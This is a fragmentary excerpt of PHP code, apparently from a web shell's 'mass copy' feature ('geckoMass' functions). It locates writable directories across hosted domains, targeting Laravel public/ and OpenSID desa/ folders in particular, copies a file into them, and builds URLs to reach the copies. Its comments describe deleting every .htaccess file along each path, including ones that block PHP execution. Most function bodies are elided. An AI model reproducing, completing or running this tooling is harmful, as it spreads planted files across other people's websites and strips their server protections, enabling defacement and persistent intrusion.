...
/**
 * OpenSID / SID-desa style app: has desa/ + marker (rfm|pbb|donjo-app|storage|catatan_rilis.md).
 */
...
function geckoMassOpenSidDesaDir($dir)
{
    ...
    // Already inside …/desa of an OpenSID app
...
/**
 * Keep only paths strictly under $root. Drop sibling dirs (storage/app/vendor/…).
 */
...
/**
 * Scoped deep writable search: only under $root (e.g. Laravel public/ or OpenSID desa/).
 * Prefers farthest (deepest) dirs; falls back to shallower / $root itself.
 */
 ...
 * Laravel → public/ | OpenSID → desa/ | else normal.
 */
...
function geckoMassBuildUrl($scheme, $domainName, $domainDir, $dest)
{
    ...
    // Prefer stripping known web-root segment (public_html, public, …) — NOT desa
    foreach (geckoMassWebRoots() as $wr) {
        $prefix = $domainDir . '/' . $wr . '/';
...
/**
 * Delete EVERY .htaccess from $fromRoot down to $targetDir (each path segment).
 * Example: desa/upload/gis/lokasi/point → wipe .htaccess in desa, upload, gis, lokasi, point.
 */
...
{
    // Legacy helper: now wipe all .htaccess along the path (not only PHP-blocking)
...
function geckoMassCopyRun($src, $base, $debug = false, $v2 = false, $limit = 0, $offset = 0, $v3 = false, $mode = '')
{
    ...
    foreach ($targets as $target) {
        ...
        // Scoped apps (v1/v2/v3):
        // - Laravel → ONLY public/ (URL strips /public/)
        // - OpenSID (desa + rfm|pbb|donjo-app|storage|catatan_rilis.md) → ONLY desa/ (URL keeps /desa/)
        $laravelPublic = geckoMassLaravelPublicDir($domainDir);
        $desaDir = geckoMassOpenSidDesaDir($domainDir);
        $scopedRoot = '';
        $scopedLabel = '';
        ...
        if ($laravelPublic !== '') {
            ...
            $urlRoot = $laravelPublic; // https://domain.com/path/file
            ...
            $isScoped = true;
            $webRoot = $desaDir;
            // App root as URL base so output keeps /desa/...
        ...
        foreach ($candidates as $targetDir) {
            // Scoped safety: refuse paste outside public/ or desa/
            if ($isScoped) {
            ...
            // Wipe .htaccess on EVERY dir from webRoot → targetDir
            // e.g. desa/upload/gis/lokasi/point → hapus .htaccess di tiap segment
